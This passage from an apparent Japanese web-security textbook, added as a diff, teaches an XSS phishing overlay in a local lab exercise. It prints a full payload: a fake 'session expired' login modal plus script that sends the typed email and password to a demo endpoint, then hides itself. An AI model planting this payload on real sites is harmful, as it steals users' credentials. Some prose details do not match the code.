+      <td>パスワード使い回しで全サービスに波及</td>
+      </tr>
+      </tbody>
+      </table>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p><code>position: fixed</code> と <code>z-index: 99999</code>
+      を使うと既存のページより前面に要素を重ねられるのはなぜですか？ブラウザのレイアウト仕様と関係していますか？</p>
+      </blockquote>
+      <h3 data-number="9.2.2" id="css-の-position-fixed-z-index-が鍵"><span
+      class="header-section-number">9.2.2</span> CSS の position: fixed + z-index が鍵</h3>
+      <p><code>z-index: 99999</code> の要素は、ページ上のすべての要素より前面に表示されます。また
+      <code>position: fixed</code>
+      は「ブラウザのビューポート基準で固定」するため、スクロールしても逃げられません。そして、<code>width/height</code>
+      を <code>100vw/100vh</code> することで画面全体を完全に覆うことができてしまいます。</p>
+      <p>本来は UI レイアウトのための仕様でしが、XSS
+      が成立した瞬間、攻撃者がこれを自由に悪用できることに注目してください。</p>
+      <h2 data-number="9.3" id="攻撃ペイロードの詳細"><span class="header-section-number">9.3</span>
+      攻撃ペイロードの詳細</h2>
+      <p>以下の 3 パートがどのように組み合わさって攻撃が成立するか、順番に確認してください。</p>
+      <h3 data-number="9.3.1" id="part-acss-オーバーレイとモーダルの外観"><span
+      class="header-section-number">9.3.1</span> Part A：CSS — オーバーレイとモーダルの外観</h3>
+      <div class="sourceCode" id="cb55" data-caption="オーバーレイとモーダル外観の設定"><pre
+      class="sourceCode html"><code class="sourceCode html"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-overlay</span> {</span>
+<span id="cb55-3"><a href="#cb55-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">position</span><span class="ch">:</span> <span class="dv">fixed</span><span class="op">;</span> <span class="kw">top</span><span class="ch">:</span> <span class="dv">0</span><span class="op">;</span> <span class="kw">left</span><span class="ch">:</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb55-4"><a href="#cb55-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">width</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">vw</span><span class="op">;</span> <span class="kw">height</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">vh</span><span class="op">;</span></span>
+<span id="cb55-5"><a href="#cb55-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">background</span><span class="ch">:</span> <span class="fu">rgba(</span><span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0.8</span><span class="fu">)</span><span class="op">;</span></span>
+<span id="cb55-6"><a href="#cb55-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">99999</span><span class="op">;</span></span>
+<span id="cb55-7"><a href="#cb55-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">display</span><span class="ch">:</span> <span class="dv">flex</span><span class="op">;</span> <span class="kw">align-items</span><span class="ch">:</span> <span class="dv">center</span><span class="op">;</span> <span class="kw">justify-content</span><span class="ch">:</span> <span class="dv">center</span><span class="op">;</span></span>
+<span id="cb55-8"><a href="#cb55-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">font-family</span><span class="ch">:</span> <span class="dv">sans-serif</span><span class="op">;</span></span>
+<span id="cb55-9"><a href="#cb55-9" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb55-10"><a href="#cb55-10" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> {</span>
+<span id="cb55-11"><a href="#cb55-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">background</span><span class="ch">:</span> <span class="cn">#fff</span><span class="op">;</span> <span class="kw">border-radius</span><span class="ch">:</span> <span class="dv">10</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb55-12"><a href="#cb55-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">padding</span><span class="ch">:</span> <span class="dv">36</span><span class="dt">px</span> <span class="dv">32</span><span class="dt">px</span><span class="op">;</span> <span class="kw">width</span><span class="ch">:</span> <span class="dv">460</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb55-13"><a href="#cb55-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">box-shadow</span><span class="ch">:</span> <span class="dv">0</span> <span class="dv">8</span><span class="dt">px</span> <span class="dv">32</span><span class="dt">px</span> <span class="fu">rgba(</span><span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0.35</span><span class="fu">)</span><span class="op">;</span></span>
+<span id="cb55-14"><a href="#cb55-14" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb55-15"><a href="#cb55-15" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> h2 { <span class="kw">margin</span><span class="ch">:</span> <span class="dv">0</span> <span class="dv">0</span> <span class="dv">8</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">18</span><span class="dt">px</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#111</span><span class="op">;</span> }</span>
+<span id="cb55-16"><a href="#cb55-16" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> p  { <span class="kw">margin</span><span class="ch">:</span> <span class="dv">0</span> <span class="dv">0</span> <span class="dv">20</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">13</span><span class="dt">px</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#555</span><span class="op">;</span> }</span>
+<span id="cb55-17"><a href="#cb55-17" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> input {</span>
+<span id="cb55-18"><a href="#cb55-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">display</span><span class="ch">:</span> <span class="dv">block</span><span class="op">;</span> <span class="kw">width</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">%</span><span class="op">;</span> <span class="kw">box-sizing</span><span class="ch">:</span> <span class="dv">border-box</span><span class="op">;</span></span>
+<span id="cb55-19"><a href="#cb55-19" aria-hidden="true" tabindex="-1"></a>    <span class="kw">padding</span><span class="ch">:</span> <span class="dv">10</span><span class="dt">px</span> <span class="dv">12</span><span class="dt">px</span><span class="op">;</span> <span class="kw">margin-bottom</span><span class="ch">:</span> <span class="dv">12</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb55-20"><a href="#cb55-20" aria-hidden="true" tabindex="-1"></a>    <span class="kw">border</span><span class="ch">:</span> <span class="dv">1</span><span class="dt">px</span> <span class="dv">solid</span> <span class="cn">#d1d5db</span><span class="op">;</span> <span class="kw">border-radius</span><span class="ch">:</span> <span class="dv">6</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">14</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb55-21"><a href="#cb55-21" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb55-22"><a href="#cb55-22" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> button {</span>
+<span id="cb55-23"><a href="#cb55-23" aria-hidden="true" tabindex="-1"></a>    <span class="kw">width</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">%</span><span class="op">;</span> <span class="kw">padding</span><span class="ch">:</span> <span class="dv">11</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb55-24"><a href="#cb55-24" aria-hidden="true" tabindex="-1"></a>    <span class="kw">background</span><span class="ch">:</span> <span class="cn">#4f46e5</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#fff</span><span class="op">;</span> <span class="kw">border</span><span class="ch">:</span> <span class="dv">none</span><span class="op">;</span></span>
+<span id="cb55-25"><a href="#cb55-25" aria-hidden="true" tabindex="-1"></a>    <span class="kw">border-radius</span><span class="ch">:</span> <span class="dv">6</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">14</span><span class="dt">px</span><span class="op">;</span> <span class="kw">cursor</span><span class="ch">:</span> <span class="dv">pointer</span><span class="op">;</span></span>
+<span id="cb55-26"><a href="#cb55-26" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb55-27"><a href="#cb55-27" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> button<span class="in">:hover</span> { <span class="kw">background</span><span class="ch">:</span> <span class="cn">#4338ca</span><span class="op">;</span> }</span>
+<span id="cb55-28"><a href="#cb55-28" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> <span class="fu">.close-link</span> {</span>
+<span id="cb55-29"><a href="#cb55-29" aria-hidden="true" tabindex="-1"></a>    <span class="kw">display</span><span class="ch">:</span> <span class="dv">block</span><span class="op">;</span> <span class="kw">margin-top</span><span class="ch">:</span> <span class="dv">14</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb55-30"><a href="#cb55-30" aria-hidden="true" tabindex="-1"></a>    <span class="kw">text-align</span><span class="ch">:</span> <span class="dv">center</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">12</span><span class="dt">px</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#6b7280</span><span class="op">;</span> <span class="kw">cursor</span><span class="ch">:</span> <span class="dv">pointer</span><span class="op">;</span></span>
+<span id="cb55-31"><a href="#cb55-31" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb55-32"><a href="#cb55-32" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span></code></pre></div>
+      <ul>
+      <li><code>rgba(0,0,0,0.65)</code>
+      の半透明黒で背景を暗くし、本物のページが見えることで「正規のサイト上にダイアログが出た」と錯覚させていることに注目してください</li>
+      <li>モーダルのデザインはこのアプリのログインページに合わせて調整してあります</li>
+      </ul>
+      <h3 data-number="9.3.2" id="part-bhtml-偽ダイアログの構造"><span
+      class="header-section-number">9.3.2</span> Part B：HTML — 偽ダイアログの構造</h3>
+      <div class="sourceCode" id="cb56" data-caption="偽ダイアログの構造"><pre
+      class="sourceCode html"><code class="sourceCode html"><span id="cb56-1"><a href="#cb56-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-overlay&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb56-2"><a href="#cb56-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-modal&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb56-3"><a href="#cb56-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">h2</span><span class="dt">&gt;</span>⚠️ セッションの有効期限が切れました<span class="dt">&lt;/</span><span class="kw">h2</span><span class="dt">&gt;</span></span>
+<span id="cb56-4"><a href="#cb56-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>セキュリティのため、再度ログインしてください。<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb56-5"><a href="#cb56-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-form&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb56-6"><a href="#cb56-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="ot">    id</span><span class="op">=</span><span class="st">&quot;xss-email&quot;</span><span class="ot"> placeholder</span><span class="op">=</span><span class="st">&quot;メールアドレス&quot;</span></span>
+<span id="cb56-7"><a href="#cb56-7" aria-hidden="true" tabindex="-1"></a><span class="ot">             autocomplete</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb56-8"><a href="#cb56-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;password&quot;</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-pass&quot;</span><span class="ot">  placeholder</span><span class="op">=</span><span class="st">&quot;パスワード&quot;</span></span>
+<span id="cb56-9"><a href="#cb56-9" aria-hidden="true" tabindex="-1"></a><span class="ot">             autocomplete</span><span class="op">=</span><span class="st">&quot;current-password&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb56-10"><a href="#cb56-10" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">button</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;submit&quot;</span><span class="dt">&gt;</span>ログイン<span class="dt">&lt;/</span><span class="kw">button</span><span class="dt">&gt;</span></span>
+<span id="cb56-11"><a href="#cb56-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
+<span id="cb56-12"><a href="#cb56-12" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb56-13"><a href="#cb56-13" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span></code></pre></div>
+      <ul>
+      <li><code>autocomplete="current-password"</code>
+      を指定するとブラウザのパスワードマネージャーが自動入力の対象となります。被害者がワンクリックで認証情報を入力してしまう点に注目してください。</li>
+      </ul>
+      <h3 data-number="9.3.3" id="part-cjs-認証情報の送信と証拠隠滅"><span
+      class="header-section-number">9.3.3</span> Part C：JS — 認証情報の送信と証拠隠滅</h3>
+      <div class="sourceCode" id="cb57" data-caption="認証情報の送信と証拠隠滅"><pre
+      class="sourceCode html"><code class="sourceCode html"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb57-2"><a href="#cb57-2" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-form&#39;</span>)<span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;submit&#39;</span><span class="op">,</span> <span class="kw">function</span>(e) {</span>
+<span id="cb57-3"><a href="#cb57-3" aria-hidden="true" tabindex="-1"></a>    e<span class="op">.</span><span class="fu">preventDefault</span>()<span class="op">;</span></span>
+<span id="cb57-4"><a href="#cb57-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> email <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-email&#39;</span>)<span class="op">.</span><span class="at">value</span><span class="op">;</span></span>
+<span id="cb57-5"><a href="#cb57-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> pass  <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-pass&#39;</span>)<span class="op">.</span><span class="at">value</span><span class="op">;</span></span>
+<span id="cb57-6"><a href="#cb57-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fetch</span>(<span class="st">&#39;/api/xss?c=&#39;</span> <span class="op">+</span> <span class="pp">encodeURIComponent</span>(<span class="st">&#39;email=&#39;</span> <span class="op">+</span> email <span class="op">+</span> <span class="st">&#39;&amp;pass=&#39;</span> <span class="op">+</span> pass))<span class="op">;</span></span>
+<span id="cb57-7"><a href="#cb57-7" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-overlay&#39;</span>)<span class="op">.</span><span class="fu">remove</span>()<span class="op">;</span></span>
+<span id="cb57-8"><a href="#cb57-8" aria-hidden="true" tabindex="-1"></a>    location<span class="op">.</span><span class="at">href</span> <span class="op">=</span> <span class="st">&#39;/&#39;</span><span class="op">;</span></span>
+<span id="cb57-9"><a href="#cb57-9" aria-hidden="true" tabindex="-1"></a>  })<span class="op">;</span></span>
+<span id="cb57-10"><a href="#cb57-10" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-close&#39;</span>)<span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;click&#39;</span><span class="op">,</span> <span class="kw">function</span>() {</span>
+<span id="cb57-11"><a href="#cb57-11" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-overlay&#39;</span>)<span class="op">.</span><span class="fu">remove</span>()<span class="op">;</span></span>
+<span id="cb57-12"><a href="#cb57-12" aria-hidden="true" tabindex="-1"></a>  })<span class="op">;</span></span>
+<span id="cb57-13"><a href="#cb57-13" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+      <ul>
+      <li><code>fetch('/api/xss?c=...')</code>
+      でメール・パスワードをデモ用エンドポイントに送信しています</li>
+      <li>送信直後にオーバーレイを <code>remove()</code> し、<code>/</code>
+      へリダイレクトします。被害者は「ログインし直せた」と思いページを普通に使い続けます</li>
+      <li><code>e.preventDefault()</code> で<span
+      class="masked">実際のフォーム送信（ページ遷移）は起こさず</span>、バックグラウンドの
+      <code>fetch</code> だけ実行しています</li>
+      </ul>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p>このコードで <code>e.preventDefault()</code>
+      を呼んでいる理由を説明してください。また、<code>fetch()</code> の直後に
+      <code>location.href = '/login'</code> を実行している攻撃者の意図は何ですか？</p>
+      </blockquote>
+      <h2 data-number="9.4" id="演習-フィッシングオーバーレイを体験する"><span
+      class="header-section-number">9.4</span> 📝演習 — フィッシングオーバーレイを体験する</h2>
+      <p>まず <code>npm run dev</code> でアプリを起動してください。</p>
+      <h3 data-number="9.4.1" id="攻撃者としてペイロードを仕込む-1"><span
+      class="header-section-number">9.4.1</span> 1. 攻撃者としてペイロードを仕込む</h3>
+      <ol type="1">
+      <li><code>http://localhost:3000/login</code> からログインする。</li>
+      <li><code>http://localhost:3000/member/about</code> を開く。</li>
+      <li><strong>公開URL</strong> に任意のスラグを設定 (例: <code>piyopiyo</code>) する</li>
+      <li><strong>コンテンツ</strong>
+      に以下のペイロード全体を貼り付けて「更新」をクリックしてください</li>
+      </ol>
+      <div class="sourceCode" id="cb58" data-caption="攻撃用ペイロード"><pre
+      class="sourceCode html"><code class="sourceCode html"><span id="cb58-1"><a href="#cb58-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb58-2"><a href="#cb58-2" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-overlay</span> {</span>
+<span id="cb58-3"><a href="#cb58-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">position</span><span class="ch">:</span> <span class="dv">fixed</span><span class="op">;</span> <span class="kw">top</span><span class="ch">:</span> <span class="dv">0</span><span class="op">;</span> <span class="kw">left</span><span class="ch">:</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb58-4"><a href="#cb58-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">width</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">vw</span><span class="op">;</span> <span class="kw">height</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">vh</span><span class="op">;</span></span>
+<span id="cb58-5"><a href="#cb58-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">background</span><span class="ch">:</span> <span class="fu">rgba(</span><span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0.8</span><span class="fu">)</span><span class="op">;</span></span>
+<span id="cb58-6"><a href="#cb58-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">z-index</span><span class="ch">:</span> <span class="dv">99999</span><span class="op">;</span></span>
+<span id="cb58-7"><a href="#cb58-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">display</span><span class="ch">:</span> <span class="dv">flex</span><span class="op">;</span> <span class="kw">align-items</span><span class="ch">:</span> <span class="dv">center</span><span class="op">;</span> <span class="kw">justify-content</span><span class="ch">:</span> <span class="dv">center</span><span class="op">;</span></span>
+<span id="cb58-8"><a href="#cb58-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">font-family</span><span class="ch">:</span> <span class="dv">sans-serif</span><span class="op">;</span></span>
+<span id="cb58-9"><a href="#cb58-9" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb58-10"><a href="#cb58-10" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> {</span>
+<span id="cb58-11"><a href="#cb58-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">background</span><span class="ch">:</span> <span class="cn">#fff</span><span class="op">;</span> <span class="kw">border-radius</span><span class="ch">:</span> <span class="dv">10</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb58-12"><a href="#cb58-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">padding</span><span class="ch">:</span> <span class="dv">36</span><span class="dt">px</span> <span class="dv">32</span><span class="dt">px</span><span class="op">;</span> <span class="kw">width</span><span class="ch">:</span> <span class="dv">460</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb58-13"><a href="#cb58-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">box-shadow</span><span class="ch">:</span> <span class="dv">0</span> <span class="dv">8</span><span class="dt">px</span> <span class="dv">32</span><span class="dt">px</span> <span class="fu">rgba(</span><span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0.35</span><span class="fu">)</span><span class="op">;</span></span>
+<span id="cb58-14"><a href="#cb58-14" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb58-15"><a href="#cb58-15" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> h2 { <span class="kw">margin</span><span class="ch">:</span> <span class="dv">0</span> <span class="dv">0</span> <span class="dv">8</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">18</span><span class="dt">px</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#111</span><span class="op">;</span> }</span>
+<span id="cb58-16"><a href="#cb58-16" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> p  { <span class="kw">margin</span><span class="ch">:</span> <span class="dv">0</span> <span class="dv">0</span> <span class="dv">20</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">13</span><span class="dt">px</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#555</span><span class="op">;</span> }</span>
+<span id="cb58-17"><a href="#cb58-17" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> input {</span>
+<span id="cb58-18"><a href="#cb58-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">display</span><span class="ch">:</span> <span class="dv">block</span><span class="op">;</span> <span class="kw">width</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">%</span><span class="op">;</span> <span class="kw">box-sizing</span><span class="ch">:</span> <span class="dv">border-box</span><span class="op">;</span></span>
+<span id="cb58-19"><a href="#cb58-19" aria-hidden="true" tabindex="-1"></a>    <span class="kw">padding</span><span class="ch">:</span> <span class="dv">10</span><span class="dt">px</span> <span class="dv">12</span><span class="dt">px</span><span class="op">;</span> <span class="kw">margin-bottom</span><span class="ch">:</span> <span class="dv">12</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb58-20"><a href="#cb58-20" aria-hidden="true" tabindex="-1"></a>    <span class="kw">border</span><span class="ch">:</span> <span class="dv">1</span><span class="dt">px</span> <span class="dv">solid</span> <span class="cn">#d1d5db</span><span class="op">;</span> <span class="kw">border-radius</span><span class="ch">:</span> <span class="dv">6</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">14</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb58-21"><a href="#cb58-21" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb58-22"><a href="#cb58-22" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> button {</span>
+<span id="cb58-23"><a href="#cb58-23" aria-hidden="true" tabindex="-1"></a>    <span class="kw">width</span><span class="ch">:</span> <span class="dv">100</span><span class="dt">%</span><span class="op">;</span> <span class="kw">padding</span><span class="ch">:</span> <span class="dv">11</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb58-24"><a href="#cb58-24" aria-hidden="true" tabindex="-1"></a>    <span class="kw">background</span><span class="ch">:</span> <span class="cn">#4f46e5</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#fff</span><span class="op">;</span> <span class="kw">border</span><span class="ch">:</span> <span class="dv">none</span><span class="op">;</span></span>
+<span id="cb58-25"><a href="#cb58-25" aria-hidden="true" tabindex="-1"></a>    <span class="kw">border-radius</span><span class="ch">:</span> <span class="dv">6</span><span class="dt">px</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">14</span><span class="dt">px</span><span class="op">;</span> <span class="kw">cursor</span><span class="ch">:</span> <span class="dv">pointer</span><span class="op">;</span></span>
+<span id="cb58-26"><a href="#cb58-26" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb58-27"><a href="#cb58-27" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> button<span class="in">:hover</span> { <span class="kw">background</span><span class="ch">:</span> <span class="cn">#4338ca</span><span class="op">;</span> }</span>
+<span id="cb58-28"><a href="#cb58-28" aria-hidden="true" tabindex="-1"></a>  <span class="pp">#xss-modal</span> <span class="fu">.close-link</span> {</span>
+<span id="cb58-29"><a href="#cb58-29" aria-hidden="true" tabindex="-1"></a>    <span class="kw">display</span><span class="ch">:</span> <span class="dv">block</span><span class="op">;</span> <span class="kw">margin-top</span><span class="ch">:</span> <span class="dv">14</span><span class="dt">px</span><span class="op">;</span></span>
+<span id="cb58-30"><a href="#cb58-30" aria-hidden="true" tabindex="-1"></a>    <span class="kw">text-align</span><span class="ch">:</span> <span class="dv">center</span><span class="op">;</span> <span class="kw">font-size</span><span class="ch">:</span> <span class="dv">12</span><span class="dt">px</span><span class="op">;</span> <span class="kw">color</span><span class="ch">:</span> <span class="cn">#6b7280</span><span class="op">;</span> <span class="kw">cursor</span><span class="ch">:</span> <span class="dv">pointer</span><span class="op">;</span></span>
+<span id="cb58-31"><a href="#cb58-31" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb58-32"><a href="#cb58-32" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb58-33"><a href="#cb58-33" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-overlay&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb58-34"><a href="#cb58-34" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-modal&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb58-35"><a href="#cb58-35" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">h2</span><span class="dt">&gt;</span>⚠️ セッションの有効期限が切れました<span class="dt">&lt;/</span><span class="kw">h2</span><span class="dt">&gt;</span></span>
+<span id="cb58-36"><a href="#cb58-36" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>セキュリティのため、再度ログインしてください。<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb58-37"><a href="#cb58-37" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-form&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb58-38"><a href="#cb58-38" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="ot">    id</span><span class="op">=</span><span class="st">&quot;xss-email&quot;</span><span class="ot"> placeholder</span><span class="op">=</span><span class="st">&quot;メールアドレス&quot;</span></span>
+<span id="cb58-39"><a href="#cb58-39" aria-hidden="true" tabindex="-1"></a><span class="ot">             autocomplete</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb58-40"><a href="#cb58-40" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;password&quot;</span><span class="ot"> id</span><span class="op">=</span><span class="st">&quot;xss-pass&quot;</span><span class="ot">  placeholder</span><span class="op">=</span><span class="st">&quot;パスワード&quot;</span></span>
